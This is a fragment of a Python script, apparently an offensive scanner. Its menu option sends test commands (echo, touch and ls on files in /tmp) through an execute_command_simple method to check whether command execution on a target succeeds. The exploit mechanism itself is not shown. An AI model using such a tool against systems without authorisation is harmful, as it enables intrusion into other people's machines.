                    print(f"[+] ✅ Works! Output: {result['output']}")
                else:
                    print("[-] ❌ Failed")
            except Exception as e:
                print(f"[-] Error: {e}")
            
            # Test 2: Echo with text
            print("\n[TEST 2] Echo command: echo test123")
            try:
                result = scanner.execute_command_simple('echo test123', show_debug=True)
                if result['success']:
                    print(f"[+] ✅ Works! Output: {result['output']}")
                else:
                    print("[-] ❌ Failed")
            except Exception as e:
                print(f"[-] Error: {e}")
            
            # Test 3: Touch file (simple file operation)
            print("\n[TEST 3] Touch file: touch /tmp/test.txt")
            try:
                result = scanner.execute_command_simple('touch /tmp/test.txt', show_debug=True)
                if result['success']:
                    print(f"[+] ✅ Works! Output: {result['output']}")
                    # Verify
                    verify = scanner.execute_command_simple('ls -la /tmp/test.txt', show_debug=False)
                    if verify['success']:
                        print(f"[+] File created: {verify['output']}")
                else:
                    print("[-] ❌ Failed")
            except Exception as e:
                print(f"[-] Error: {e}")
            
            # Test 4: Create file with echo (no special chars)
            print("\n[TEST 4] Echo to file without quotes: echo test > /tmp/test2.txt")
            try:
                result = scanner.execute_command_simple('echo test > /tmp/test2.txt', show_debug=True)
                if result['success']:
                    print(f"[+] ✅ Works! Output: {result['output']}")
                else:
                    print("[-] ❌ Failed")
            except Exception as e:
                print(f"[-] Error: {e}")
        else:
            print("[-] Invalid option")


if __name__ == "__main__":
    main()
